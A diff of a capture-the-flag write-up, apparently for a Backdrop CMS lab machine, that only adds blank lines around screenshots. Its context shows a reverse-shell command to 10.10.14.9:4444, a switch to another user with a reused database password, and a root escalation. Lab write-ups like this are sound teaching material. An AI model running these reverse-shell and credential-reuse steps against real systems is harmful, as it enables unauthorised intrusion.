@@ -55,9 +55,11 @@ Target (shell): `bash -c 'bash -i >& /dev/tcp/10.10.14.9/4444 0>&1'`
 - In `/home`, there were two users: `jobert` and `johncusack`. The `user flag` belonged to `johncusack`, but I didn't have direct access.
 ![Screenshot](https://imgur.com/BToevl6.png)
 - I tried switching users with the database password found earlier: `su johncusack`
+
 ![Screenshot](https://imgur.com/3b388rm.png)
 - It worked. After switching, I upgraded the shell for better usability: `script /dev/null -c bash`
 - I then accessed the user flag.
+
 ![Screenshot](https://imgur.com/wmXeXqT.png)
 
 ### 🔐 Privilege Escalation to Root
@@ -71,5 +73,6 @@ Target (shell): `bash -c 'bash -i >& /dev/tcp/10.10.14.9/4444 0>&1'`
 - It turns out I had to specify the Backdrop root directory, which is where the Backdrop CMS is located: `/var/www/html`
 ![Screenshot](https://imgur.com/4i9nzQS.png)
 - This granted a root shell. From there, I read the root.txt and captured the root flag.
+
 ![Screenshot](https://imgur.com/thbiBzV.png)
 
